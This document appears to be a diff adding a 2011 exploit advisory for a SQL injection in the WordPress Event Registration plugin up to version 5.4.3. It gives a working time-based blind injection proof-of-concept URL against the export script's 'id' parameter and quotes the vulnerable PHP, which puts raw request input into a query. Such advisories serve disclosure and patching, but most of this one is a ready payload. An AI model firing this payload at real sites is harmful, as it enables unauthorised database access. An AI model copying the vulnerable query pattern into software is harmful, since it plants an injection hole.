@@ -1,0 +1,19 @@
+# Exploit Title: WordPress Event Registration plugin <= 5.4.3 SQL Injection Vulnerability
+# Date: 2011-08-30
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/event-registration.5.43.zip
+# Version: 5.4.3 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/event-registration/event_registration_export.php?id=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+$id= $_REQUEST['id'];
+...
+$sql  = "SELECT * FROM " . $events_detail_tbl . " WHERE id='$id'";
+$result = mysql_query($sql);
